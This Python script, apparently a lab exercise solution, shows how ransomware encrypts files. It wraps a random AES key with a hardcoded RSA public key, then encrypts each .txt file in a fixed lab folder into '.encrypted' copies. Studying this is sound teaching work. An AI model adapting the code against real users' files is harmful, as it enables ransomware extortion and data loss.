from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
from base64 import b64encode
import os

public_key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCbFSDwEHCzc5mD4R9qnXgaG4fG
K/jRQADoHKNtooZ/6+A+4QrSs7e/jPU6VkDF6w/3PEIUd4oWLohevODwTzjlDiK0
ANDpMubVLBvHvOai/yOs8NPZVuQRxfHR5dxCTG9ILOMilisvQ2KExVdMT/CKNU62
6A0rDBlfHwzkScytrwIDAQAB
-----END PUBLIC KEY-----"""

#generate random shared key k
k_shared_key = os.urandom(32)
print(k_shared_key)

#encrypt key
rsa_key = RSA.import_key(public_key)
cipher_rsa = PKCS1_OAEP.new(rsa_key)
encrypted_k = cipher_rsa.encrypt(k_shared_key)
 
#output to EncryptedSharedKey
with(open('/home/cse/Lab3/Solutions/Q6/EncryptedSharedKey', "wb")) as f:
    f.write(encrypted_k)


#search folder & encrypt everything with .txt (replace with txt.encrypted)
target_directory = "/home/cse/Lab3/Solutions/Q6/EncryptedFolder"


for file in os.listdir(target_directory):
    filepath = os.path.join(target_directory, file)

    # Encrypt Only .txt Files
    if filepath.endswith(".txt"):
        with open(filepath, "rb") as f:
            plaintext = f.read()

        iv = get_random_bytes(12)

        # Encrypt the file using AES-GCM
        cipher_aes = AES.new(k_shared_key, AES.MODE_GCM, nonce=iv)
        ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)

        # Save the encrypted content to a new file with .encrypted extension
        with open(filepath + ".encrypted", "wb") as f:
            f.write(iv + tag + ciphertext)
